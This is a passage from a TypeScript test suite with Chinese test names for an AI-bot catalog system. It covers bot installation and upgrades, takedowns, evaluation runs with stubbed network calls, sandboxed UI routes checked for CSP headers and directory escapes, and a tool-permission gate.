      expect(await installer.update(id)).toBe("current");
      expect(network).not.toHaveBeenCalled();
    });
    it("目录换了头像：没换过头像的实例跟着换（不用等升级），用户自己选过的不动", async () => {
      const bot = await inst.install("fixture-bot", "zh-CN");
      expect(bot.settings.avatar).toBe("blue");
      expect(bot.app!.avatar).toBe("blue");
      const dir = path.join(repo, "bots", "fixture-bot");
      const swap = (avatar: string) => {
        const f = path.join(dir, "bot.json");
        fs.writeFileSync(f, fs.readFileSync(f, "utf8").replace(/"avatar": "\w+"/, `"avatar": "${avatar}"`));
        const bundledDir = path.join(tmp, `builtin-${avatar}`);
        expect(packBuiltinCatalog({ root: repo, outDir: bundledDir }).failures).toEqual([]);
        return new BotInstaller({ ...inst.o, catalog: new BotCatalog({ dataDir: data, appVersion: "9.9.9", bundledDir }) });
      };
      swap("law").followAvatars();
      expect(store.getBot(id)!.settings.avatar).toBe("law");
      expect(store.getBot(id)!.app!.avatar).toBe("law");
      store.updateBot(id, { settings: { ...store.getBot(id)!.settings, avatar: "red" } });
      swap("code").followAvatars();
      expect(store.getBot(id)!.settings.avatar).toBe("red");
      expect(store.getBot(id)!.app!.avatar).toBe("code");
    });
    it("0.1.30 以前装的目录 Bot 没记目录给的头像：还是当年借的专家头像就换成专属形象", () => {
      expect(followedAvatar("design", { catalogId: "printfilm" }, "film")).toBe("film");
      expect(followedAvatar("design", { catalogId: "ppt-master" }, "slides")).toBe("slides");
      expect(followedAvatar("data", { catalogId: "company-research" }, "dossier")).toBe("dossier");
      expect(followedAvatar("finance", { catalogId: "us-stock-research" }, "ticker")).toBe("ticker");
      expect(followedAvatar("red", { catalogId: "printfilm" }, "film")).toBe("red");
      expect(followedAvatar("", { catalogId: "printfilm" }, "film")).toBe("film");
      expect(followedAvatar("design", { catalogId: "printfilm", avatar: "film" }, "film")).toBe("design");
    });
    it("目录里两个 Bot 不能用同一个头像", () => {
      makeBot(path.join(repo, "bots", "twin-bot"), "twin-bot");
      const r = packBuiltinCatalog({ root: repo, outDir: path.join(tmp, "builtin-twin") });
      expect(r.failures.map((f) => [path.basename(f.dir), f.issues.map((i) => i.rule)])).toEqual([["twin-bot", ["format.avatar"]]]);
    });
    it("目录升级不能覆盖用户导入的同名技能，即使尚未部署到运行目录", async () => {
      await inst.install("fixture-bot", "zh-CN");
      const user = new UserSkills(data, store);
      const pkg = await readSkillZip(skillZip([{ path: "SKILL.md", text: skillMd("custom-skill", "user instructions") }]));
      user.install(id, pkg, null);
      const dir = path.join(repo, "bots", "fixture-bot");
      write(dir, "bot.json", fs.readFileSync(path.join(dir, "bot.json"), "utf8").replace('"version": "1.0.0"', '"version": "1.1.0"'));
      write(dir, "skills/custom-skill/SKILL.md", "catalog instructions");
      pack(2000);
      await c.sync();
      await expect(inst.update(id)).rejects.toMatchObject({ code: "skill_conflict" });
      expect(user.detail(id, "custom-skill").instructions).toContain("user instructions");
      expect(store.getBot(id)!.app!.version).toBe("1.0.0");
      expect(fs.existsSync(skills("own", "SKILL.md"))).toBe(true);
    });
    it("下架：普通下架只记下来；安全原因停掉进程、删掉技能，数据不动", async () => {
      await inst.install("fixture-bot", "zh-CN");
      write(repo, "catalog.json", JSON.stringify({ removed: { "fixture-bot": { reason: "x" } } }));
      pack(2000);
      await c.sync();
      await inst.applyTakedowns();
      expect(store.getBot(id)!.app!.removed).toMatchObject({ reason: "x" });
      expect(fs.existsSync(skills("own"))).toBe(true);
      expect(stopped).toEqual([]);

      store.updateBot(id, { app: { ...store.getBot(id)!.app!, removed: undefined } });
      write(repo, "catalog.json", JSON.stringify({ removed: { "fixture-bot": { reason: "bad", security: true } } }));
      pack(3000);
      await c.sync();
      await inst.applyTakedowns();
      expect(stopped).toEqual([id]);
      expect(fs.existsSync(skills("own"))).toBe(false);
      expect(fs.existsSync(ws("app", "state.json"))).toBe(true);
      await expect(inst.install("other", "zh-CN")).rejects.toMatchObject({ code: "catalog_not_found" });
    });
    it("移除：默认清干净；保留数据时留下工作区，再次使用接着用", async () => {
      await inst.install("fixture-bot", "zh-CN");
      fs.writeFileSync(ws("app", "state.json"), JSON.stringify({ title: "mine", items: [] }));
      store.setKV("sidebar-layout", JSON.stringify({ version: 1, sections: [{ id: "mine", default: true, items: ["c:fixture-bot"] }] }));
      inst.markRemoved("fixture-bot"); store.deleteBot(id);
      inst.cleanup(id, true);
      expect(inst.isRemoved("fixture-bot")).toBe(true);
      expect(JSON.parse(store.getKV("sidebar-layout")!).sections[0].items).toEqual([]);
      expect(fs.existsSync(path.join(data, "dsh", id))).toBe(false);
      await inst.install("fixture-bot", "zh-CN");
      expect(JSON.parse(fs.readFileSync(ws("app", "state.json"), "utf8")).title).toBe("mine");
      expect(inst.isRemoved("fixture-bot")).toBe(false);
      expect(store.getKV("catalog.removed.fixture-bot")).toBeUndefined();
      store.deleteBot(id);
      inst.cleanup(id, false);
      expect(fs.existsSync(ws())).toBe(false);
    });
    it("目录 Bot 的字段写进数据库后读得回来，用户自建的不受影响", async () => {
      await inst.install("fixture-bot", "zh-CN");
      expect(new Store(path.join(data, "anymodel.db")).getBot(id)!.app!.catalogId).toBe("fixture-bot");
      expect(store.createBot({ name: "mine" })).toMatchObject({ origin: "user", app: null });
    });
  });

  it("开发目录：登记后出现在目录里，开发路径不走下载", async () => {
    const dev = makeBot(path.join(tmp, "dev"), "dev-bot");
    const c = new BotCatalog({ dataDir: path.join(tmp, "d3"), appVersion: "9.9.9" });
    expect(c.addDev(dev).id).toBe("dev-bot");
    expect(c.list().map((e) => e.id)).toEqual(["dev-bot"]);
    expect(await c.ensureUi(c.get("dev-bot")!)).toBe(dev);
    expect(new BotCatalog({ dataDir: path.join(tmp, "d3"), appVersion: "9.9.9" }).list().length).toBe(1);
    c.removeDev("dev-bot");
    expect(c.list()).toEqual([]);
  });
});

describe("评测", () => {
  afterEach(() => void vi.unstubAllGlobals());
  it("每种语言的可点的话都跑，并且用那种语言安装", async () => {
    const dir = makeBot(path.join(tmp, "bot"));
    const installs: Array<string | undefined> = [];
    let n = 0;
    vi.stubGlobal("fetch", async (url: string, init: { headers: Record<string, string> }) => {
      if (url.includes("/chat/stream")) return new Response("");
      if (url.endsWith("/install")) installs.push(init.headers["x-amb-lang"]);
      return Response.json(url.includes("/app/file") ? { json: { n: n++ }, issues: [] } : {});
    });
    const report = await runEvals({ dir, manifest: checkStatic(dir).manifest!, app: "http://app" });
    expect(installs.filter(Boolean)).toEqual(["zh-CN", "zh-CN", "en", "en"]);
    expect(report.results.filter((r) => r.kind === "starter")).toHaveLength(4);
  });
  it("产物只信文件本身：存在、大小、zip 条目、不该有的文件", async () => {
    const dir = makeBot(path.join(tmp, "bot"));
    write(dir, "evals/tasks.json", JSON.stringify([
      { id: "good", prompt: "p", file: { name: "a.md", text: "hi" }, files: [{ match: "^app/out/a\\.pptx$", minBytes: 3, zipHas: ["ppt/slides/slide1.xml"] }, { match: "\\.tmp$", absent: true }] },
      { id: "no-file", prompt: "p", files: [{ match: "^app/none$" }] },
      { id: "too-small", prompt: "p", files: [{ match: "^app/out/a\\.pptx$", minBytes: 9999 }] },
      { id: "bad-zip", prompt: "p", files: [{ match: "^app/out/a\\.pptx$", zipHas: ["ppt/slides/slide9.xml"] }] },
      { id: "should-be-absent", prompt: "p", files: [{ match: "^app/out/a\\.pptx$", absent: true }] },
    ]));
    let n = 0;
    const prompts: string[] = [];
    vi.stubGlobal("fetch", async (url: string, init: { body?: string }) => {
      if (url.includes("/chat/stream")) {
        prompts.push(JSON.parse(init.body!).text);
        return new Response("");
      }
      if (url.includes("/app/inbox")) return Response.json({ path: "app/inbox/a.md" });
      if (url.includes("/app/list")) return Response.json({ files: [{ path: "app/out/a.pptx", size: 100 }] });
      if (url.includes("/app/download")) return new Response("PK..ppt/slides/slide1.xml..");
      return Response.json(url.includes("/app/file") ? { json: { n: n++ }, issues: [] } : {});
    });
    const report = await runEvals({ dir, manifest: checkStatic(dir).manifest!, app: "http://app" });
    const tasks = Object.fromEntries(report.results.filter((r) => r.kind === "task").map((r) => [r.id, r]));
    expect(tasks.good.ok).toBe(true);
    expect(prompts[0]).toContain("app/inbox/a.md");
    expect(tasks["no-file"].note).toContain("缺少文件");
    expect(tasks["too-small"].ok).toBe(false);
    expect(tasks["bad-zip"].note).toContain("slide9");
    expect(tasks["should-be-absent"].note).toContain("不该有");
    expect(report.issues.map((i) => i.rule)).toContain("behavior.completion");
  });
  it("没人点审批：声明过的权限放行，其余拒绝，提问就答一句", async () => {
    const dir = makeBot(path.join(tmp, "bot"));
    const f = path.join(dir, "bot.json");
    fs.writeFileSync(f, JSON.stringify({ ...JSON.parse(fs.readFileSync(f, "utf8")), permissions: ["workspace-write", "network"] }));
    let n = 0;
    let first = true;
    let pending: Array<{ id: string; kind: string; tool: string }> = [
      { id: "a", kind: "approval", tool: "web_search" },
      { id: "b", kind: "approval", tool: "task_start" },
      { id: "c", kind: "question", tool: "" },
    ];
    const decided: string[] = [];
    vi.stubGlobal("fetch", async (url: string) => {
      if (url.includes("/chat/stream")) {
        if (first) await new Promise((r) => setTimeout(r, 1200));
        first = false;
        return new Response("");
      }
      if (url.includes("/approvals?")) {
        const out = pending;
        pending = [];
        return Response.json({ approvals: out });
      }
      if (url.includes("/approvals/")) {
        decided.push(url.split("/approvals/")[1]);
        return Response.json({});
      }
      return Response.json(url.includes("/app/file") ? { json: { n: n++ }, issues: [] } : {});
    });
    await runEvals({ dir, manifest: checkStatic(dir).manifest!, app: "http://app" });
    expect(decided.sort()).toEqual(["a/approve", "b/deny", "c/answer"]);
  }, 20_000);
});

describe("界面的静态路由", () => {
  let dir: string;
  let server: http.Server;
  let base: string;
  beforeEach(async () => {
    dir = makeBot(path.join(tmp, "bot"));
    const uiDir = path.join(import.meta.dirname, "..", "ui");
    const preact = path.dirname(import.meta.resolve("preact").replace("file://", ""));
    const root = path.dirname(preact);
    const vendor = { "preact.mjs": path.join(root, "dist", "preact.mjs"), "hooks.mjs": path.join(root, "hooks", "dist", "hooks.mjs") };
    const catalog = { get: (id: string) => (id === "fixture-bot" ? { dev: dir } : undefined), uiDirIfPresent: () => undefined, thumb: async () => undefined } as any;
    server = http.createServer((req, res) => {
      if (!serveBotAppStatic(req, res, new URL(req.url!, "http://x"), { uiDir, vendor, catalog })) res.writeHead(418).end();
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
    base = `http://127.0.0.1:${(server.address() as AddressInfo).port}/amb/botapp`;
  });
  afterEach(() => {
    server.closeAllConnections();
    server.close();
  });
  it("页面带 CSP：不能联网、强制沙箱", async () => {
    const res = await fetch(`${base}/d/fixture-bot/index.html`);
    const csp = res.headers.get("content-security-policy")!;
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("sandbox allow-scripts allow-forms");
    expect(csp).not.toContain("allow-same-origin");
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(botAppCsp("http://h")).toContain("default-src 'none'");
  });
  it("不透明来源能加载模块：有 CORS 头", async () => {
    const res = await fetch(`${base}/kit/kit.js`);
    expect(res.status).toBe(200);
    expect(res.headers.get("access-control-allow-origin")).toBe("*");
  });
  it("hooks 里的裸引用改成相对路径（沙箱页不能写 import map）", async () => {
    const text = await (await fetch(`${base}/kit/vendor/hooks.mjs`)).text();
    expect(text).toContain('"./preact.mjs"');
    expect(text).not.toMatch(/from\s*["']preact["']/);
  });
  it("设计系统能读，别的文件不给；不能走出目录", async () => {
    expect((await fetch(`${base}/kit/design/index.css`)).status).toBe(200);
    expect((await fetch(`${base}/kit/design/gallery.js`)).status).toBe(404);
    expect((await fetch(`${base}/d/fixture-bot/..%2Fpersona.md`)).status).toBe(404);
    expect((await fetch(`${base}/d/nobody/index.html`)).status).toBe(404);
    expect((await fetch(`${base}/b/${"0".repeat(64)}/index.html`)).status).toBe(404);
    expect((await fetch(`${base}/kit/app.js`, { method: "POST" })).status).toBe(405);
  });
});

describe("权限门", () => {
  const load = async (deny: string[], ask: string[], home: string) => {
    process.env.AMB_BOT_DENY_TOOLS = JSON.stringify(deny);
    process.env.AMB_BOT_ASK_TOOLS = JSON.stringify(ask);
    process.env.HOME = home;
    // 插件在 apply() 里读环境变量，同一个模块可以反复用
    // @ts-expect-error 插件是原生 JS，没有类型声明
    const mod: any = await import("../dsh-runtime/plugins/amb-bot-gate.mjs");
    const hooks: Record<string, Function> = {};
    mod.apply({ on: (n: string, fn: Function) => (hooks[n] = fn) });
    return hooks;
  };
  const home0 = process.env.HOME;
  afterEach(() => {
    process.env.HOME = home0;
    delete process.env.AMB_BOT_DENY_TOOLS;
    delete process.env.AMB_BOT_ASK_TOOLS;
  });
  const allow = async () => ({ kind: "allow" });
  it("什么都不限制时不挂钩子", async () => {
    expect(Object.keys(await load([], [], tmp))).toEqual([]);
  });
  it("没声明的一律拒绝", async () => {
    const h = await load(["web_search"], [], tmp);
    expect((await h["tools/pre-execute"]({ name: "web_search" }, allow)).kind).toBe("deny");
    expect((await h["tools/pre-execute"]({ name: "read" }, allow)).kind).toBe("allow");
  });
  it("声明了的第一次要问；真的跑过才算同意，拒绝了下次还问；重启后还记得", async () => {
    let h = await load([], ["web_fetch"], tmp);
    expect((await h["tools/pre-execute"]({ name: "web_fetch" }, allow)).kind).toBe("ask");
    expect((await h["tools/pre-execute"]({ name: "web_fetch" }, allow)).kind).toBe("ask");
    await h["tools/execute"]({ name: "web_fetch" }, async () => ({}));
    expect((await h["tools/pre-execute"]({ name: "web_fetch" }, allow)).kind).toBe("allow");
    h = await load([], ["web_fetch"], tmp);
    expect((await h["tools/pre-execute"]({ name: "web_fetch" }, allow)).kind).toBe("allow");
  });
  it("别的规则已经拒绝的不改成询问", async () => {
    const h = await load([], ["web_fetch"], tmp);
    expect((await h["tools/pre-execute"]({ name: "web_fetch" }, async () => ({ kind: "deny" }))).kind).toBe("deny");
  });
});

describe("同伴名单", () => {
  it("系统提示词只列用户的机器人（host.ts syncPrompt 过滤 origin）", () => {
    const text = fs.readFileSync(path.join(import.meta.dirname, "..", "src", "agent", "host.ts"), "utf8");
    expect(text).toContain('b.origin !== "catalog"');
    expect(botPrompt({ name: "a", persona: "", memory: false, others: [] })).not.toContain("其他机器人");
  });
});
